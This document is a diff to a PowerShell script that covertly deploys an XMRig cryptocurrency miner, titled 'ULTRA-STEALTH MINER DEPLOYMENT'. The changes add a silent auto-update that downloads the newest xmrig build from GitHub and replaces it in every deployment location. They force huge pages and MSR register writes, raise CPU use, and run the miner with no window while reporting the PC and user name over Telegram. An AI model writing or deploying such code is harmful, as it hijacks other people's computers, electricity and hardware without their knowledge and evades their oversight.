@@ -50,6 +50,55 @@ if (-not $Debug) {
     } catch {}
 }
 
+# ================================================================================================
+# STEALTH AUTO-UPDATE XMRIG TO LATEST VERSION (NEW)
+# ================================================================================================
+
+ Update-XmrigStealthily {
+    Write-Log "Checking for newer xmrig version (stealth update)..." "INFO"
+    
+    $latestUrl = "https://api.github.com/repos/xmrig/xmrig/releases/latest"
+    $tempZip = "$env:TEMP\xmrig_latest.zip"
+    $tempExtract = "$env:TEMP\xmrig_extract"
+    
+    try {
+        $release = Invoke-RestMethod -Uri $latestUrl -UseBasicParsing
+        $downloadUrl = $null
+        foreach ($asset in $release.assets) {
+            if ($asset.name -like "*win64*.zip") {
+                $downloadUrl = $asset.browser_download_url
+                break
+            }
+        }
+        if (-not $downloadUrl) { throw "No win64 zip found" }
+        
+        # Download silently
+        Invoke-WebRequest -Uri $downloadUrl -OutFile $tempZip -UseBasicParsing
+        
+        # Extract only xmrig.exe
+        Expand-Archive -Path $tempZip -DestinationPath $tempExtract -Force
+        $newExe = Get-ChildItem $tempExtract -Recurse -Filter "xmrig.exe" | Select-Object -First 1
+        
+        if ($newExe) {
+            # Replace in ALL deployment locations
+            foreach ($loc in $Config.Locations) {
+                $target = Join-Path $loc "xmrig.exe"
+                if (Test-Path $target) {
+                    Copy-Item $newExe.FullName $target -Force
+                    Write-Log "Updated xmrig.exe in $loc" "INFO"
+                }
+            }
+            Write-Log "xmrig updated to latest version successfully" "SUCCESS"
+        }
+        
+        # Cleanup
+        Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
+        Remove-Item $tempExtract -Recurse -Force -ErrorAction SilentlyContinue
+    } catch {
+        Write-Log "Auto-update skipped (no internet or error): $($_.Exception.Message)" "WARN"
+    }
+}
+
 # Validate Telegram credentials
 if ([string]::IsNullOrEmpty($TelegramToken) -or [string]::IsNullOrEmpty($ChatID)) {
     Write-Warning "Telegram credentials not configured - notifications will be disabled"
@@ -843,7 +892,7 @@ function New-OptimizedConfig {
             init = 4                           # Optimized threads for dataset init (faster startup)
             "init-avx2" = 4                    # AVX2 optimized init
             mode = "fast"                      # Fast mode (uses more RAM, much faster)
-            "1gb-pages" = $SystemCaps.SupportsHugePages  # Huge pages = 10-20% boost
+            "1gb-pages" = $true  # Huge pages = 10-20% boost
             rdmsr = $true                      # Read MSR registers
             wrmsr = $true                      # Write MSR registers (enable prefetcher)
             "wrmsr-presets" = @("intel")       # Intel MSR optimizations (Raptor Lake)
@@ -855,16 +904,16 @@ function New-OptimizedConfig {
         # ========== CPU CONFIGURATION (OPTIMIZED) ==========
         cpu = @{
             enabled = $true
-            "huge-pages" = $SystemCaps.SupportsHugePages  # CRITICAL: 10-20% boost
-            "huge-pages-jit" = $SystemCaps.SupportsHugePages  # JIT huge pages
-            priority = 4                       # Maximum priority (High)
-            "memory-pool" = 4096               # Larger memory pool (4GB for better performance)
-            yield = $false                     # Don't yield CPU to other processes
-            "max-threads-hint" = 75           # Use 100% of threads
-            asm = $true                        # Use assembly optimizations
-            "astrobwt-max-size" = 550          # Astrobwt optimization
-            "astrobwt-avx2" = $true            # Use AVX2 for Astrobwt
-            "cpu-affinity" = @(0, 2, 4, 6, 8, 10, 1, 3, 5, 7)  # Intel i5-14400 P-cores first
+            "huge-pages" = $true                    # FORCED ENABLED
+            "huge-pages-jit" = $true                # FORCED ENABLED
+            priority = 4
+            "memory-pool" = 4096
+            yield = $false
+            "max-threads-hint" = 85
+            asm = $true
+            "astrobwt-max-size" = 550
+            "astrobwt-avx2" = $true
+            "cpu-affinity" = @(0, 2, 4, 6, 8, 10, 1, 3, 5, 7)
         }
         
         # Disable GPU mining (CPU only for stability)
@@ -1625,7 +1674,7 @@ function Start-OptimizedMiner {
         # Start miner without window (more reliable than -WindowStyle Hidden)
         $processInfo = New-Object System.Diagnostics.ProcessStartInfo
         $processInfo.FileName = $minerPath
-        $processInfo.Arguments = "--config=`"$configPath`""
+        $processInfo.Arguments = "--config=`"$configPath`" --randomx-1gb-pages"
         $processInfo.UseShellExecute = $false
         $processInfo.CreateNoWindow = $true
         $processInfo.WorkingDirectory = Split-Path $minerPath
@@ -1945,6 +1994,8 @@ function Send-Telegram {
 function Main {
     Write-Log "=== ULTRA-STEALTH MINER DEPLOYMENT ==="
     Write-Log "PC: $env:COMPUTERNAME | User: $env:USERNAME"
+    # NEW: Stealth auto-update xmrig before doing anything else
+    Update-XmrigStealthily
     Write-Log "SINGLE INSTANCE ENFORCEMENT: ENABLED"
     
     # Step 0: AUTO-DETECT DEVICE TYPE (Smart Board Protection)
